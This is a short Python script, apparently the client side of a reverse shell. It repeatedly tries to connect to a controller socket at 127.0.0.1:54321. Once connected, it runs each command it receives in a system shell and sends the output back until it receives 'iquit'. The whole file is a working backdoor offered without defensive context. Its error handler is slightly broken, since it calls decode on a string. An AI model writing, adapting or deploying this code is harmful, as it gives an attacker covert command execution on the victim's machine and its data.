#cient
from datetime import datetime as dt
import json
import socket
import base64
import subprocess
import sys
import os
import time
import shutil



def connect():
    global soc
    soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            time.sleep(5)
            soc.connect(("127.0.0.1",54321))
            shell()
            break
        except:
            continue
    
def shell():
    while True:
        command=reliable_recv()
        if command =="iquit":
            break
        else:
            try:
                print(command)
                proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                print(command)
                result=proc.stdout.read()+proc.stderr.read()            
                print(result)
                reliable_send(result)
            except:
                reliable_send("OOPS! That command cannot be executed")


def reliable_send(data):
    json_data=json.dumps(data.decode())
    soc.send(json_data.encode())
    
    
def reliable_recv():
    json_data=""
    while True:
        try:
            json_data+=soc.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

connect()
soc.close()